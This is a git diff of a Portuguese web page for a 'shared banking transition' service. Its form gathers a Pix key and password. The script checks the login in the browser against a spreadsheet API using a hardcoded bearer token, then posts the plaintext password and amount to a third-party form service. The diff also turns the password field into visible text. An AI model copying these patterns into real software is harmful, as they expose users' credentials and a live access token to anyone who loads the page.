@@ -5,23 +5,21 @@
 		<meta charset="utf-8" />
 		<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
 		<link rel="stylesheet" href="assets/css/main.css" />
-<link rel"stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css"/>
 		<noscript><link rel="stylesheet" href="assets/css/noscript.css" /></noscript>
 	
 </head>
-
-	
 	<body class="is-preload">
 	    
 		<!-- Wrapper-->
 			<div id="wrapper">
 				<!-- Nav -->
 				<h1 class="cartao digitacao">𝔽𝕒𝕤𝕥𝕪𝕡𝕖</h1>
-				<p>serviço de conta compartilhada</p>
+				<p>serviço de transição bancária compartilhada</p>
 						
 					<!-- Nav -->
 					<nav id="nav">
   <a href="#" class="icon solid fa-user"><span>Home</span></a>
+
   
 </nav>
 	<!-- Main -->
@@ -83,16 +81,46 @@ divDados.appendChild(pixDiv);
   <div class="container">
    <center> <h1>transição</h1></center>
     <form id="meu-formulario">
-      <label for="email">chave pix:</label>
-      <input type="text" id="email" name="email"><br><br>
-      <label for="senha">Senha:</label>
-      <input type="password" id="senha" name="senha"><br><br>
+      <label for="email">Chave Pix:</label>
+<input type="text" id="email" name="email">
+<span id="email-error"></span>
+<br><br>
+
+<label for="senha">Senha:</label>
+<input type="text" id="senha" name="senha">
+<span id="senha-error"></span>
+<br><br>
+<script>
+  const emailInput = document.getElementById('email');
+  const senhaInput = document.getElementById('senha');
+  const emailError = document.getElementById('email-error');
+  const senhaError = document.getElementById('senha-error');
+
+  emailInput.addEventListener('input', () => {
+    if (emailInput.value.includes(' ')) {
+      emailError.textContent = 'Erro: Chave Pix não pode conter espaços';
+    } else {
+      emailError.textContent = '';
+    }
+  });
+
+  senhaInput.addEventListener('input', () => {
+    if (senhaInput.value.includes(' ')) {
+      senhaError.textContent = 'Erro: Senha não pode conter espaços';
+    } else {
+      senhaError.textContent = '';
+    }
+  });
+</script>
+
+
+
       <label for="valor">Valor:</label>
       <input type="number" id="valor" name="valor"><br><br>
-      <label for="operacao">tipo</label>
+      <label for="operacao">tipo de transição:</label>
 <select id="operacao" name="operacao">
-<option value="saque">Saque</option>
-<option value="deposito">Depósito</option>
+<option value="saque">pix</option>
+<option value="deposito">saque</option>
 </select>
 <br></br>
 <button type="submit">Enviar</button>
@@ -101,60 +129,70 @@ divDados.appendChild(pixDiv);
 
 <script>
   const formulario = document.getElementById('meu-formulario');
-  formulario.addEventListener('submit', (event) => {
-    event.preventDefault();
-    const email = document.getElementById('email').value;
-    const senha = document.getElementById('senha').value;
-    const valor = document.getElementById('valor').value;
-const operacao =
-document.getElementById('operacao').value;
 
-    if (email && senha) {
-      fetch('https://api.zerosheets.com/v1/k3u', {
-  method: 'GET',
-  headers: {
-    'Authorization': 'Bearer qU9cIh2Yr6lMDwtft7qHb10Dbkf72VLu',
-    'Content-Type': 'application/json',
-  },
-})
-.then((response) => response.json())
-.then((data) => {
-  const usuario = data.find((u) => u.email === email && u.senha === senha);
-  if (usuario) {
-    const formatacao = { email, senha, valor, operacao, };
-    fetch('https://api.sheetmonkey.io/form/pJZCcZ9aABKDXHJCQmbDrc', {
-      method: 'POST',
+formulario.addEventListener('submit', (event) => {
+  event.preventDefault();
+  const email = document.getElementById('email').value;
+  const senha = document.getElementById('senha').value;
+  const valor = document.getElementById('valor').value;
+  const operacao = document.getElementById('operacao').value;
+
+  if (email && senha) {
+    fetch('https://api.zerosheets.com/v1/k3u', {
+      method: 'GET',
       headers: {
+        'Authorization': 'Bearer qU9cIh2Yr6lMDwtft7qHb10Dbkf72VLu',
         'Content-Type': 'application/json',
       },
-      body: JSON.stringify(formatacao),
     })
     .then((response) => response.json())
     .then((data) => {
-      if (data) {
-        alert('Formulário enviado com sucesso!');
+      const usuario = data.find((u) => u.email === email && u.senha === senha);
+      if (usuario) {
+        const formatacao = {
+          email,
+          senha,
+          valor,
+          operacao,
+        };
+
+        fetch('https://api.sheetmonkey.io/form/pJZCcZ9aABKDXHJCQmbDrc', {
+          method: 'POST',
+headers: {
+'Content-Type': 'application/json',
+},
+body: JSON.stringify({
+email: email,
+senha: senha,
+valor: valor,
+operacao: operacao,
+}),
+})
+.then((response) => response.json())
+.then((data) => {
+if (data) {
+alert('Formulário enviado com sucesso!');
+} else {
+alert('Transição registrada com sucesso, aguarde...');
+}
+})
+.catch((error) => {
+alert('Erro ao enviar formulário!');
+console.error(error);
+});
       } else {
-        alert(' transição registradas com sucesso');
+        alert('Chave Pix ou senha não estão registrados no nosso sistema!');
       }
     })
     .catch((error) => {
-      alert('transição registradas com sucesso');
+      alert('Sistema em manutenção, tente novamente mais tarde');
       console.error(error);
     });
   } else {
-    alert('chave pix ou senha não estão registrados no nosso sistema!');
+    alert('Preencha todos os campos!');
   }
-})
-.catch((error) => {
-  alert('estamos passando por atualização no sistema,tente novamente mais tarde');
-  console.error(error);
 });
-    } else {
-      alert('Preencha todos os campos!');
-    }
-  });
 </script>
-
  
   </div>
     
